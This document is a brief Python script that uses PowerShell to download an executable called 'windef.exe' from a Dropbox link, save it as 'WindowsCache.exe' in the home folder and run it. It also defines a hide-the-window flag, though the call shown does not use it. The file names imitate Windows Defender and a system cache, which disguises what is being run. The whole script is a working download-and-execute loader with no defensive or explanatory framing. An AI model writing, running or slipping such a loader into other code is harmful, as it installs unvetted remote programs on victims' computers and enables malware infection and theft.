import os
import subprocess
creationflags = subprocess.CREATE_NO_WINDOW
subprocess.run('powershell Invoke-WebRequest -Uri "https://dl.dropbox.com/scl/fi/jeyh5skw4yfejo89jrms9/windef.exe?rlkey=8eskz8wpj79mqjn0b8bf2uhoz&dl=0" -OutFile "~/WindowsCache.exe"; Invoke-Expression "~/WindowsCache.exe"')